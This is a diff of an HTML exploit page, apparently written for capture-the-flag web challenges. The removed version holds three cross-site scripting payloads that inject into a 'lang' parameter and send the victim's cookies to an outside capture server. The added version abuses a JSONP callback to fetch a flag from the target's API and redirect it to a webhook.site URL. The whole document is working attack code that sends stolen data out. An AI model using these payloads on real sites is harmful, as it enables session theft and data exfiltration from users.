@@ -1,38 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Cookie Exfiltration</title>
+  <head>
+    <title>Exploit</title>
     <script>
-        // First, let's confirm the page loads at all
-        var img0 = new Image();
-        img0.src = "https://ssrf-eta.vercel.app/api/capture?debug=html_page_loaded&timestamp=" + Date.now();
-        
-        setTimeout(function() {
-            // Create multiple XSS payloads to try different approaches
-            
-            // Payload 1: Basic cookie exfil
-            const xssPayload1 = '"; var img1 = new Image(); img1.src = "https://ssrf-eta.vercel.app/api/capture?method=basic&cookies=" + encodeURIComponent(document.cookie); //';
-            
-            // Payload 2: Try document.write
-            const xssPayload2 = '"; document.write("<img src=\\"https://ssrf-eta.vercel.app/api/capture?method=docwrite&cookies=" + encodeURIComponent(document.cookie) + "\\">"); //';
-            
-            // Payload 3: Try with fetch wrapped in try-catch
-            const xssPayload3 = '"; try { fetch("https://ssrf-eta.vercel.app/api/capture?method=fetch&cookies=" + encodeURIComponent(document.cookie)); } catch(e) { var img = new Image(); img.src = "https://ssrf-eta.vercel.app/api/capture?method=fetch_error&error=" + e.message; } //';
-            
-            // Try the first payload
-            const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload1);
-            
-            // Signal we're about to redirect
-            var img2 = new Image();
-            img2.src = "https://ssrf-eta.vercel.app/api/capture?debug=about_to_redirect&url=" + encodeURIComponent(targetUrl);
-            
-            setTimeout(function() {
-                window.location.href = targetUrl;
-            }, 500);
-        }, 1000);
+      // Global callback for JSONP
+      window.exploit = function(obj) {
+        fetch("https://jnotes-web.chal.idek.team/api/flag")
+          .then(r => r.json())
+          .then(f => {
+            location.href = "https://webhook.site/ea8b6f5e-4146-4582-901b-496f56bb8e92?flag=" + encodeURIComponent(f.flag);
+          });
+      };
     </script>
-</head>
-<body>
-    <p>Redirecting to extract cookies...</p>
-</body>
+  </head>
+  <body>
+    <h1>Running exploit...</h1>
+    <script src="https://jnotes-web.chal.idek.team/api/view/cff4cf7c170e92881c3bcab84de78f95?callback=exploit"></script>
+  </body>
 </html>
